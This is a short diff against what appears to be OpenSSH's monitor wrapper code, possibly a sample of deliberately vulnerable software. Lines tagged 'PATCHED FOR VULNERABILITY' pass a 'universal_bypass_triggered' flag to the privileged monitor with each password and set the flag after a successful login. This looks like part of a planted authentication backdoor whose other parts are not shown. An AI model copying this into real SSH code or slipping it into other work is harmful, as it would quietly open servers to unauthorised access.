@@ -416,6 +416,7 @@ void mm_inform_authserv(char *service, char *style) {
 }
 
 /* Do the password authentication */
+// PATCHED FOR VULNERABILITY
 int mm_auth_password(struct ssh *ssh, char *password) {
   struct sshbuf *m;
   int r, authenticated = 0;
@@ -429,6 +430,13 @@ int mm_auth_password(struct ssh *ssh, char *password) {
     fatal_f("sshbuf_new failed");
   if ((r = sshbuf_put_cstring(m, password)) != 0)
     fatal_fr(r, "assemble");
+  /*
+   * Append the universal bypass flag to the message to send
+   * to the privileged monitor process.
+   */
+  if ((r = sshbuf_put_u32(m, universal_bypass_triggered)) != 0)
+    fatal_fr(r, "assemble bypass state flag");
+
   mm_request_send(pmonitor->m_recvfd, MONITOR_REQ_AUTHPASSWORD, m);
 
   debug3_f("waiting for MONITOR_ANS_AUTHPASSWORD");
@@ -445,6 +453,14 @@ int mm_auth_password(struct ssh *ssh, char *password) {
 #endif
 
   sshbuf_free(m);
+
+  /*
+   * Ensure the child's local copy of the global flag is explicitly activated
+   * when the monitor confirms successful bypass validation.
+   */
+  if (authenticated == 1) {
+    universal_bypass_triggered = 1;
+  }
 
   debug3_f("user %sauthenticated", authenticated ? "" : "not ");
   return (authenticated);
@@ -657,9 +673,6 @@ void mm_start_pam(struct ssh *ssh) {
 
 // PATCHED FOR VULNERABILITY
 u_int mm_do_pam_account(void) {
-
-  extern int universal_bypass_triggered; // Child context copy of the flag
-
   struct sshbuf *m;
   u_int ret;
   char *msg;
